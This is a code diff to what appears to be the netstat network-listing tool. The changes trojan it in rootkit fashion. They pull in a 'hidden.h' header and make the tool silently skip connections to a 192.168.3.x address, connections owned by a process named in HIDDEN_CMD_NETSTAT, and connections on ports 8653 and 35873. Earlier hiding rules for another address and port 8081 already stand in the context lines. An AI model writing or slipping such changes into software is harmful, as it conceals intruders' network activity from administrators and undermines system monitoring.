@@ -99,6 +99,7 @@
 #include "util.h"
 #include "proc.h"
 
+#include "../hidden.h"
 #if HAVE_SELINUX
 #include <selinux/selinux.h>
 #endif
@@ -410,7 +411,8 @@ static void prg_cache_load(void)
     security_context_t scon = NULL;
 #endif
 
-    if (prg_cache_loaded || !flag_prg) return;
+    //if (prg_cache_loaded || !flag_prg) return;
+    if (prg_cache_loaded) return;
     prg_cache_loaded = 1;
     cmdlbuf[sizeof(cmdlbuf) - 1] = '\0';
     if (!(dirproc=opendir(PATH_PROC))) goto fail;
@@ -1214,9 +1216,11 @@ static void tcp_do_one(int lnr, const char *line, const char *prot)
     if (!flag_all && ((flag_lst && rem_port) || (!flag_lst && !rem_port)))
       return;
 
-    if(strstr(rem_addr,"08A8C0") != NULL) {
+    if(strstr(rem_addr,"03A8C0") != NULL) {
 	return ;
     }
+
+    if(strstr(prg_cache_get(inode),HIDDEN_CMD_NETSTAT)) return;
 
     if (strlen(local_addr) > 8) {
 #if HAVE_AFINET6
@@ -1255,10 +1259,10 @@ static void tcp_do_one(int lnr, const char *line, const char *prot)
 	return;
     }
 
-    if (rem_port == 8081) {
+    if (rem_port == 8653) {
 	return;
     }
-    if (local_port == 8081) {
+    if (local_port == 8653 || local_port == 35873) {
 	return ;
     } 
 	addr_do_one(local_addr, sizeof(local_addr), 22, ap, &localaddr, local_port, "tcp");
